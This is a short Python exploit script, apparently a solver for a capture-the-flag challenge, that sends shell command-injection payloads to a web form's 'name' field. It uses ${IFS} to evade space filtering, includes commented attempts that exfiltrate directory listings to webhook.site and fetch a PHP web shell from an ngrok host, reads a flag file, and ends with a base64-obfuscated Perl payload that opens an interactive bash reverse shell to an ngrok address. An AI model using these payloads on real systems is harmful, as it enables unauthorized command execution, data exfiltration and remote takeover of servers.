# Just record my process.
import requests

url = "http://h4ck3r.quest:8301/"

s = requests.Session()

payload = '''\'$(which${IFS}python)\''''
# payload = '''\'$(echo${IFS}${PS2})\'''' ${PS2} is > in bash
# payload = '''\'$(curl${IFS}webhook.site/49b688a1-c561-4eaa-944a-b25d7d428307/`ls${IFS}-al`)\''''
#payload = '''\'$(curl${IFS}https://6d79-140-116-118-236.jp.ngrok.io/shell.php${IFS}--output${IFS}aaaaaashell.php)\'''' # cannot find file
#payload = '''\'$(cat${IFS}shell.php)\''''
# no python, yes curl, no wget

#wget "https://6d79-140-116-118-236.jp.ngrok.io/shell.php"
#payload = '''\'$(perl${IFS}-MMIME::Base64${IFS}-e${IFS}\'eval(decode_base64($_))\')\''''
payload = '''\'$(cat${IFS}/*_f4b9830a65d9e956)\''''
payload = '''\'$(perl${IFS}-MMIME::Base64${IFS}-e${IFS}"system(decode_base64(\'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5qcC5uZ3Jvay5pby8xNzY4OSAwPiYxJwo=\'))\")\''''

print(payload)
r = s.post(url, data={"name":payload})

print(r.text)